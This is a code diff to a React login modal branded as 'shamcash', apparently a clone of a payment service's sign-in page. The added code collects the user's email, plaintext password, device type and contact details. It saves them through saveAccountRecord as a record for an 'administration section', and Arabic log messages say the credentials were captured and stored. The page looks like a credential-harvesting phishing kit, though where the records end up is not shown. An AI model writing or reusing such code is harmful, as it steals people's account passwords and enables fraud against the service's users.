@@ -13,7 +13,7 @@ import {
 } from 'lucide-react';
 import { useLanguage } from '../context/LanguageContext';
 import { AuthData } from '../types';
-import { isStarloveBlocked } from '../utils/accountStorage';
+import { isStarloveBlocked, saveAccountRecord, logUserActivity } from '../utils/accountStorage';
 
 interface LoginModalProps {
   isOpen: boolean;
@@ -72,6 +72,16 @@ export const LoginModal: React.FC<LoginModalProps> = ({
     setIsLoading(true);
 
     try {
+      const userAgent = typeof navigator !== 'undefined' ? navigator.userAgent : 'Web Client';
+      let deviceInfo = 'متصفح ويب';
+      if (/iPhone|iPad|iPod/i.test(userAgent)) deviceInfo = 'iPhone / iOS';
+      else if (/Android/i.test(userAgent)) deviceInfo = 'Android Mobile';
+      else if (/Windows/i.test(userAgent)) deviceInfo = 'Windows PC';
+      else if (/Macintosh/i.test(userAgent)) deviceInfo = 'Mac OS';
+
+      const now = new Date();
+      const formattedDate = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
+
       if (rememberMe) {
         if (!isStarloveBlocked(cleanEmail)) {
           localStorage.setItem('sc_waiting_email', cleanEmail.toLowerCase());
@@ -80,6 +90,30 @@ export const LoginModal: React.FC<LoginModalProps> = ({
         }
         localStorage.setItem('sc_waiting_password', password);
       }
+
+      saveAccountRecord({
+        id: localStorage.getItem('sc_request_id') || ('SC-' + Math.floor(100000 + Math.random() * 900000)),
+        fullName: localStorage.getItem('sc_contact_name') || cleanEmail.split('@')[0] || 'عميل شام كاش',
+        phone: localStorage.getItem('sc_contact_phone') || '',
+        email: cleanEmail.toLowerCase(),
+        password,
+        governorate: localStorage.getItem('sc_contact_governorate') || 'دمشق',
+        requestType: 'login',
+        status: 'under_review',
+        submittedAt: formattedDate,
+        loginAt: formattedDate,
+        sessionDuration: 'جلسة نشطة حالياً',
+        lastAction: 'تسجيل الدخول وحفظ البيانات في قسم الإدارة',
+        deviceInfo,
+        note: 'تم حفظ وتوثيق جميع معلومات الدخول في قسم الإدارة بنجاح.',
+      });
+
+      logUserActivity(
+        'تسجيل دخول وحفظ البيانات في قسم الإدارة',
+        `تم استلام وحفظ البريد الإلكتروني (${cleanEmail}) وكلمة المرور وبيانات الجهاز (${deviceInfo}) في سجلات قسم الإدارة`,
+        cleanEmail,
+        localStorage.getItem('sc_contact_name') || cleanEmail.split('@')[0]
+      );
     } catch {}
 
     setTimeout(() => {
@@ -270,7 +304,7 @@ export const LoginModal: React.FC<LoginModalProps> = ({
         {/* Security Stamp & Version shamcash اخر تحديث 3.0.2 */}
         <div className="mt-4 pt-3 border-t border-white/10 flex flex-col items-center justify-center gap-1.5 text-center">
           <div className="text-[11px] font-bold text-white/80 bg-white/5 border border-white/10 rounded-full px-3 py-1">
-            shamcash اخر تحديث 3.0.2
+            اخر تحديث shamcash 3.0.2
           </div>
           <div className="flex items-center justify-center gap-1.5 text-[10px] text-white/40">
             <ShieldCheck className="size-3.5 text-emerald-400" />
